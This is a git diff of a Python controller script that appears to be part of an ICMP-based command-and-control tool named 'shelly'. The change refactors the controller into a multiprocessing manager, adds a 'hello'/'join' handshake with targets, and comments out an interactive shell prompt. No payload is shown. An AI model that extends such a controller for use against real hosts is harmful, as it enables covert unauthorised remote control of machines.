@@ -6,7 +6,8 @@ import socket
 import psutil
 import pwd
 import base64
-from multiprocessing import Process
+from multiprocessing import Process, Manager
+from multiprocessing.managers import BaseManager
 import json
 import ast
 from shelly import Host, Target
@@ -14,6 +15,9 @@ import shelly
 
 TTL = int(64)
 ICMP_ID = int(12800)
+
+class CustomManager(BaseManager):
+    pass
 
 class Controller(Host):
     
@@ -45,7 +49,8 @@ class Controller(Host):
         match shellpack['message']:
             case "hello":
                 target = Target(shellpack)
-                target.status = ""
+                target.status = "SHAKING"
+                response_shellpack = shelly.build_shellpack(self, "join", "how are you")
                 shelly.send(target.ip, "join", "how are you")
             case "fine thank you":
                 for target in self.targets:
@@ -65,13 +70,26 @@ def setup_controller() -> Controller:
     return controller
 
 if __name__ == "__main__":
-    controller = setup_controller()
+    #BaseManager.register('Controller', Controller)
+    #manager = BaseManager()
+    #manager.start(#)
+    #controller = manager.Controller()
 
-    sniffing = Process(target=sniffing, args=(controller,))
-    sniffing.start()
+    #print(controller)
     
-    print("Starting listener")
-    while True:
-        cmd = input("shelly > ")
-        if cmd == "ls":
-            print(controller.targets[0])
+    CustomManager.register('Controller', Controller)
+    with CustomManager() as manager:
+        # create a shared set instance
+        controller = manager.Controller()
+        # start some child processes
+        sniff_proc = Process(target=sniffing, args=(controller,))
+        #for process in processes:
+        sniff_proc.start()
+    #sniffing = Process(target=sniffing, args=(controller,))
+    #sniffing.start()
+    
+    #print("Starting listener")
+    #while True:
+    #    cmd = input("shelly > ")
+    #    if cmd == "ls":
+    #        print(controller.targets[0])
